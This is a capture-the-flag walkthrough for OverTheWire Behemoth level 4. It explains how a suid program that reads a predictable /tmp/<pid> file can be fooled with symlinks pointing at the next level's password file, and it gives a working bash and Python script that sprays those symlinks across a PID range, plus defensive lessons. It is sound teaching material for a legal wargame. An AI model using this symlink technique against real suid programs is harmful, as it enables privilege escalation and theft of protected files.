# OverTheWire — Behemoth Level 4 → 5

> Goal: Get behemoth5 password from `behemoth4`. Result: **`**********`** (hidden)
> Technique: `fopen("/tmp/<pid>")` → redirect via **symlink** to the password file.

---

## 1. Connection
```bash
ssh behemoth4@behemoth.labs.overthewire.org -p 2221
```

## 2. Vulnerability — ltrace + disasm
```c
pid = getpid();
sprintf(buf, "/tmp/%d", pid);
f = fopen("/tmp/<pid>", "r");
if(!f){ puts("PID not found!"); exit; }
sleep(1);
... loop: c = fgetc(f); putchar(c);   // prints file contents (suid behemoth5)
```
The program reads `/tmp/<pid>` and prints it. If we **symlink** that path to `/etc/behemoth_pass/behemoth5`,
the program (running as behemoth5) will print the password.

## 3. Problem: PID is unpredictable (`pid_max = 4194304`)
PIDs are assigned **sequentially** → create symlinks for a wide range after an anchor pid, then run.

## 4. Exploit
```bash
BASE=$$                                  # anchor (current bash session pid)
python3 -c 'import os,sys
base=int(sys.argv[1])
for i in range(base, base+60000):
    try: os.symlink("/etc/behemoth_pass/behemoth5","/tmp/%d"%i)
    except OSError: pass' $BASE
for n in $(seq 1 30); do
  OUT=$(/behemoth/behemoth4 2>/dev/null)
  echo "$OUT" | grep -q 'PID not found' || { echo "$OUT"; break; }   # HIT -> password
done
```
> behemoth4's pid falls within `[BASE, BASE+60000]` → it finds the symlink → prints the password
> (after sleep(1)). A single run is usually enough (PIDs are sequential).


## Lessons
| Topic | Note |
|-------|------|
| Symlink redirect | Link the path the suid program reads to the password file |
| Predictable filename | `/tmp/<pid>` → attacker can pre-create the symlink |
| PID brute (window) | PIDs are sequential → anchor + wide range of symlinks |
| Defense | Use `mkstemp`/`O_NOFOLLOW` to avoid predictable /tmp filenames |
